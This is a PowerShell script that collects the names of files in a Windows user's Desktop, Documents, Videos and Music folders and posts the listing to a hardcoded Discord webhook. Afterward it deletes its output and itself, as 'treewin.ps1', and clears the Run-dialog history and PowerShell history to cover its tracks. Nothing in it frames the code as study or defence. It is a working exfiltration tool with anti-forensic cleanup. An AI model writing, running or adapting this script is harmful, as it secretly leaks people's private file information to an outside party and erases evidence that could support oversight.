# Define the folders to search
$folders = @(
    [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop'),
    [System.IO.Path]::Combine($env:USERPROFILE, 'Documents'),
    [System.IO.Path]::Combine($env:USERPROFILE, 'Videos'),
    [System.IO.Path]::Combine($env:USERPROFILE, 'Music')
)

# Define the output file path
$outputFile = [System.IO.Path]::Combine($env:TEMP, 'tree.txt')

# Function to display files in a tree structure
function Show-Tree {
    param (
        [string]$Path,
        [int]$Depth = 0
    )
    
    # Get all directories and files in the current path
    $items = Get-ChildItem -Path $Path -ErrorAction SilentlyContinue

    foreach ($item in $items) {
        # Exclude Program Files and OS files
        if ($item.FullName -notlike "*\Program Files\*" -and 
            $item.FullName -notlike "*\Windows\*" -and 
            $item.FullName -notlike "*\System32\*") {

            # Indent based on depth
            $indent = ' ' * ($Depth * 4)

            # Display the item
            if ($item.PSIsContainer) {
                "${indent}+-- $($item.Name)" | Out-File -Append -FilePath $outputFile
                # Recurse into the directory
                Show-Tree -Path $item.FullName -Depth ($Depth + 1)
            } else {
                "${indent}+-- $($item.Name)" | Out-File -Append -FilePath $outputFile
            }
        }
    }
}

# Clear the output file if it already exists
if (Test-Path $outputFile) {
    Remove-Item $outputFile
}

# Iterate through defined folders and display their contents
foreach ($folder in $folders) {
    "Contents of ${folder}:" | Out-File -Append -FilePath $outputFile
    Show-Tree -Path $folder
    "" | Out-File -Append -FilePath $outputFile
}

#########################################################################

# Define the webhook URL
$webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'

# Define the path to the text file using the TEMP environment variable
$filePath = "$env:TEMP\tree.txt"

# Check if the file exists
if (Test-Path $filePath) {
    # Read the content of the text file
    $fileContent = Get-Content -Path $filePath -Raw

    # Check the length of the file content
    if ($fileContent.Length -lt 2000) {
        # Send the entire content to the Discord webhook
        $payload = @{
            content = $fileContent
        } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
    } else {
        # Split the content into chunks of 2000 characters
        $chunkSize = 2000
        $chunks = [System.Collections.Generic.List[string]]::new()

        for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
            $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
        }

        # Send each chunk to the Discord webhook
        foreach ($chunk in $chunks) {
            # Create the payload for the webhook
            $payload = @{
                content = $chunk
            } | ConvertTo-Json

            # Try to send the content to the Discord webhook
            try {
                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
            } catch {
                # Write-Host "Error sending request: $_"
            }
        }
    }
} else {
    # Write-Host "File not found: $filePath"
}


Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\treewin.ps1" -Force -ErrorAction SilentlyContinue

#delete the entire history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Clear the PowerShell command history
Clear-History

# Display a message box indicating completion
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Finished!', 'Notification')